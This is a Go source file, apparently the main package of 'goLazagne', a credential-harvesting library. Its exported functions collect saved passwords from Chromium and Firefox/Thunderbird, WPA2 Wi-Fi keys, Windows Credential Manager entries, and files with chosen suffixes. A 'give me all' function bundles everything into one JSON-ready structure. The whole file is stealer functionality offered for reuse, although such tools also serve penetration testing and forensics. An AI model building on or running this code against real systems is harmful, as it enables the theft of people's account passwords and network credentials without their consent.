package goLazagne

import (
	"github.com/kerbyj/goLazagne/browsers"
	"github.com/kerbyj/goLazagne/common"
	"github.com/kerbyj/goLazagne/filesystem"
	"github.com/kerbyj/goLazagne/wifi"
	"github.com/kerbyj/goLazagne/windows"
)

//Common function for work with browsers. Just call and function return all saved passwords in chromium browsers and firefox
func ExtractBrowserCredentials() ([]common.UrlNamePass, int) {
	var AllBrowsersData []common.UrlNamePass
	if resultChrome := browsers.ChromeExtractDataRun(); resultChrome.Success {
		AllBrowsersData = append(AllBrowsersData, resultChrome.Data...)
	}

	if resultMozilla := browsers.MozillaExtractDataRun(); resultMozilla.Success {
		AllBrowsersData = append(AllBrowsersData, resultMozilla.Data...)
	}

	return AllBrowsersData, len(AllBrowsersData)
}

// Function that check saved credentials in chromium based browsers
func ExtractChromiumCredentials() common.ExtractCredentialsResult {
	return browsers.ChromeExtractDataRun()
}

// Function that check saved credentials in firefox browser and thunderbird
func ExtractFirefoxCredentials() common.ExtractCredentialsResult {
	return browsers.MozillaExtractDataRun()
}

//Function for extracting WPA2 PSK stored profiles
func ExtractWifiData() ([]common.NamePass, int) {
	var resultWifi = wifi.WifiExtractDataRun()
	if resultWifi.Success {
		return resultWifi.Data, len(resultWifi.Data)
	}
	return nil, 0
}

//Function for extracting saved BLOBs in windows credential storage
func ExtractCredmanData() ([]common.UrlNamePass, int) {
	var windowsResult = windows.CredManModuleStart()
	if windowsResult.Success {
		return windowsResult.Data, len(windowsResult.Data)
	}
	return nil, 0
}

//Function to search for files on the file system with specific suffixes.
func ExtractInterestingFiles(suffixes []string) []string {
	return filesystem.FindFiles(suffixes)
}

type AllDataStruct struct {
	WifiData    []common.NamePass    `json:"wifi"`
	BrowserData []common.UrlNamePass `json:"browser"`
	CredmanData []common.UrlNamePass `json:"credman"`
}

//Function in "give me all" style. The function will return everything that the program can extract from OS.
func ExtractAllData() (AllDataStruct, int) {
	var wifiData, lengthWiFiData = ExtractWifiData()
	var browserData, lengthBrowserData = ExtractBrowserCredentials()
	var credmanData, lengthCredmanData = ExtractCredmanData()

	var outDataStruct AllDataStruct

	if lengthWiFiData > 0 {
		outDataStruct.WifiData = wifiData
	}
	if lengthBrowserData > 0 {
		outDataStruct.BrowserData = browserData
	}
	if lengthCredmanData > 0 {
		outDataStruct.CredmanData = credmanData
	}

	return outDataStruct, lengthCredmanData + lengthBrowserData + lengthWiFiData
}
